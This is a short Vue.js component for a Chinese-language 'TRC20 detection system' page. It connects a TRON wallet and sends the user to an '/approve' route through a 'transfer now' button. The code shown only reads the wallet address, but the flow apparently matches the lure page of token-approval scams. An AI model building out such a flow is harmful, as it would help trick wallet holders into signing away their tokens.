<template>
  <div style="padding: 20px; text-align: center;">
    <h2>欢迎使用 TRC20 检测系统</h2>
    <van-button type="primary" block @click="connectWallet">连接钱包</van-button>
    <div style="margin-top: 20px;">钱包地址：{{ walletAddress }}</div>
    <van-button style="margin-top: 40px;" type="success" block @click="goToApprove" :disabled="!walletAddress">
      立即转账
    </van-button>
  </div>
</template>

<script setup>
import { ref } from 'vue'
import { Toast } from 'vant'
import { useRouter } from 'vue-router'

const router = useRouter()
const walletAddress = ref('')

async function connectWallet() {
  const tron = window.tronWeb
  if (!tron || !tron.defaultAddress.base58) {
    Toast.fail('请使用 imToken / TronLink 打开页面并连接钱包')
    return
  }
  walletAddress.value = tron.defaultAddress.base58
  Toast.success('连接成功')
}

function goToApprove() {
  router.push('/approve')
}
</script>